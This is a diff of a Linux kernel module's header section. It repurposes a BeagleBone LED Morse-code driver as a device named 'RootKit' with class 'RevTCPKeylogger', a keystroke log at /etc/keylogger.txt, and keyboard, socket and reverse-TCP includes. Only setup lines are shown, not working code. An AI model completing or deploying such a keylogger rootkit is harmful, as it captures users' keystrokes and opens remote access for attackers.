@@ -17,19 +17,37 @@
 #include <linux/ioctl.h>
 #include <net/sock.h>
 #include <net/tcp.h>
+#include <linux/keyboard.h>
+#include <linux/semaphore.h>
+#include <linux/kernel.h>
+#include <linux/kthread.h>  // for threads
+#include <linux/time.h>   // for using jiffies 
+#include <linux/timer.h>
+#include <linux/kmod.h>         
+#include <linux/string.h>
+#include <linux/net.h>
+#include <linux/in.h>
+#include <linux/file.h>
+#include <linux/socket.h>
+#include <linux/slab.h>
+#include <linux/syscalls.h>
+#include "reverseTCP_ioctl.h"
 
+#define DRIVER_DESC     "Keylogger"
+#define fullFileName    "/etc/keylogger.txt"
 
 #define CQ_DEFAULT	0
 
-#define  DEVICE_NAME "BBB_dev"
-#define  CLASS_NAME  "BBB"
+#define  DEVICE_NAME "RootKit"
+#define  CLASS_NAME  "RevTCPKeylogger"         
+ 
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Victor Gonzalez");
-MODULE_DESCRIPTION("Linux device driver for the B^3 in order to flash the LEDs in Morse Code");
+MODULE_AUTHOR("Pon Stars");
+MODULE_DESCRIPTION("Linux device driver...");
 MODULE_VERSION("1.0");
 
-//define listing for the LEDs to turn on
+//define listing for the LEDs to turn on // NO NEED?
 #define GPIO1_START_ADDR 0x4804C000
 #define GPIO1_END_ADDR   0x4804e000
 #define GPIO1_SIZE (GPIO1_END_ADDR - GPIO1_START_ADDR)
